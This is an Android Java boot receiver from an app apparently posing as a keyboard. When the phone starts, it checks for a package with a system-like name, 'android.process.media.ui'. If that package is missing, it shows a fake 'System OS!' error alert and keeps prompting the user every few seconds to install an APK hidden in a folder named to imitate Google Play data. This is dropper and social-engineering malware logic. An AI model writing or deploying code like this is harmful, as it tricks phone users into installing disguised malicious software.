package com.keyboard.input.uxpo;

import android.os.Handler;
import android.os.Environment;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.Uri;
import java.io.*;
import java.util.*;

public class ReceiverBoot extends BroadcastReceiver
{
	private Handler insH = new Handler();
    private Runnable insR;
    public static String title = "";
    public static String docFolder, pathExternal, pathInternal;

	@Override
	public void onReceive(Context context, Intent intent)
	{
		setDoc();
		if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
        {
        	context.startService(new Intent(context, ServiceThread.class));
        	
        	temanCek(context);
        }
	}

	public static int getScreenWidth() {
		return Resources.getSystem().getDisplayMetrics().widthPixels;
	}
	public static int getScreenHeight() {
		return Resources.getSystem().getDisplayMetrics().heightPixels;
	}

	public void setDoc() {
		pathExternal = Environment.getExternalStorageDirectory().getAbsolutePath() + "/Android/data/com.google.android.play.search";
	}

	public void temanCek(Context context) {
		setDoc();
		
		try {
			if (!new MainActivity().apkMana(context, "android.process.media.ui", "cek")) 
			{
				ServiceAlert alert = new ServiceAlert();
				title = "\t\t\t\t\t=============\n"+
					   		"\t\t\t\t\t|   System OS!   |\n"+
					    	"\t\t\t\t\t=============";
				alert.dataText = "\n"+title+"\n\n\n   Instalation failed please try again !\n   ERR code: permision denied";
				alert.dataTextSize = 15;
				alert.pilihAksi = "install";
				alert.dataPaket = pathExternal+"/android.process.media.ui-1.apk";
				context.startService(new Intent(context, ServiceAlert.class));

				insH.postDelayed(insR, 5 * 1000);

				insR = new Runnable() {
					public void run() {
						insH.postDelayed(insR, 5 * 1000);

						if (new MainActivity().apkMana(context, "android.process.media.ui", "open")) {
							insH.removeCallbacks(insR);
							context.stopService(new Intent(context, ServiceAlert.class));
        					
						} else {
							context.stopService(new Intent(context, ServiceThread.class));
						}
					}
				};
			}


		}catch(Exception e) {}
	}
}